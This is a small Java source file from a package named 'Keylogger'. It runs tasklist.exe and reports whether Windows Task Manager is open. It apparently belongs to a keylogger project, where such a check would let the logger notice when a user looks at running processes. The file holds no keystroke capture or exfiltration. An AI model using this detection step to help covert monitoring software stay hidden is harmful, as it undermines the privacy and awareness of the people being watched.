package Keylogger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Optional;
import java.util.Scanner;

public class Processos {
	public static int verificar() {
		try {
			    String line;
			    Process p = Runtime.getRuntime().exec("tasklist.exe");
			    BufferedReader input =
			            new BufferedReader(new InputStreamReader(p.getInputStream()));
			    while ((line = input.readLine()) != null) {
			    	String nome [] = line.split(" ");
			    	if(nome[0].equals("Taskmgr.exe")){
			    		System.out.println(nome[0]);
			    		return 1;
			    		//<-- Parse data here.
			    	}
			    }
			    input.close();
		} catch (Exception err) {
			    err.printStackTrace();
		}
		return 0;	
		    


	}


}
